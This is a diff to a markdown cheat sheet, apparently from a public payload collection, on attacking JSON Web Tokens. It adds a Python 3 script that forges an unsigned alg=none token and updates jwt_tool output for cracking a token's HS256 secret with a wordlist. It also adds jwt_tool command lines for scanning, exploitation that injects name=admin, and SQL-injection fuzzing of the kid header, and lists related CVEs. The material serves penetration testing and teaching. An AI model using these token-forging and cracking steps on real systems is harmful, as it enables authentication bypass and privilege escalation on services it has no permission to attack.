@@ -6,6 +6,8 @@
 
 - [Tools](#tools)
 - [JWT Format](#jwt-format)
+    - [Header](#header)
+    - [Payload](#payload)
 - [JWT Signature - None algorithm](#jwt-signature---none-algorithm)
 - [JWT Signature - RS256 to HS256](#jwt-signature---rs256-to-hs256)
 - [Breaking JWT's secret](#breaking-jwts-secret)
@@ -100,37 +102,25 @@ To exploit this vulnerability, you just need to decode the JWT and change the al
 
 However, this won't work unless you **remove** the signature
 
-The following code is a basic test for a None algorithm.
-
-```python
-import jwt
-import base64
-
-def b64urlencode(data):
-    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')
-
-print b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
-    '.' + b64urlencode("{\"data\":\"test\"}") + '.'
-```
-
 Alternatively you can modify an existing JWT (be careful with the expiration time)
 
-```python
-#!/usr/bin/python
+```python3
+#!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"
-header, payload, signature  = jwt.split('.')
+import jwt
 
-# Replacing the ALGO and the payload username
-header  = header.decode('base64').replace('HS256',"none")
-payload = (payload+"==").decode('base64').replace('test','admin')
+jwtToken 	= 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
 
-header  = header.encode('base64').strip().replace("=","")
-payload = payload.encode('base64').strip().replace("=","")
+decodedToken 	= jwt.decode(jwtToken, verify=False)  					# Need to decode the token before encoding with type 'None'
+noneEncoded 	= jwt.encode(decodedToken, key='', algorithm=None)
 
-# 'The algorithm 'none' is not supported'
-print( header+"."+payload+".")
+print(noneEncoded.decode())
+
+"""
+Output:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
+"""
 ```
 
 ## JWT Signature - RS256 to HS256
@@ -200,20 +190,24 @@ First, bruteforce the "secret" key used to compute the signature.
 
 ```powershell
 git clone https://github.com/ticarpi/jwt_tool
-python2.7 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI /tmp/wordlist
+python3 -m pip install termcolor cprint pycryptodomex requests
+python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
 
-Token header values:
-[+] alg = HS256
-[+] typ = JWT
+        \   \        \         \          \                    \
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.2                \______|             @ticarpi
 
-Token payload values:
-[+] sub = 1234567890
-[+] role = user
-[+] iat = 1516239022
+Original JWT:
 
-File loaded: /tmp/wordlist
-Testing 5 passwords...
 [+] secret is the CORRECT key!
+You can tamper/fuzz the token contents (-T/-I) and sign it using:
+python3 jwt_tool.py [options here] -S HS256 -p "secret"
 ```
 
 Then edit the field inside the JSON Web Token.
@@ -258,6 +252,13 @@ Your new forged token:
 [+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
 ```
 
+* Recon: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
+* Scanning: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
+* Exploitation: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
+* Fuzzing: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
+* Review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
+
+
 ### JWT cracker
 
 ```bash
@@ -275,6 +276,14 @@ Secret is "Sn1f"
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
 ```
 
+## CVE
+
+* CVE-2015-2951 - The alg=none signature-bypass vulnerability
+* CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability
+* CVE-2018-0114 - Key injection vulnerability
+* CVE-2019-20933/CVE-2020-28637 - Blank password vulnerability
+* CVE-2020-28042 - Null signature vulnerability
+
 ## References
 
 - [Hacking JSON Web Token (JWT) - Hate_401](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
@@ -291,3 +300,4 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
 - [HACKING JSON WEB TOKENS, FROM ZERO TO HERO WITHOUT EFFORT - Thu Feb 09 2017 - @pdp](https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
 - [Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE](http://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
 - [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017](https://trustfoundry.net/jwt-hacking-101/)
+- [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
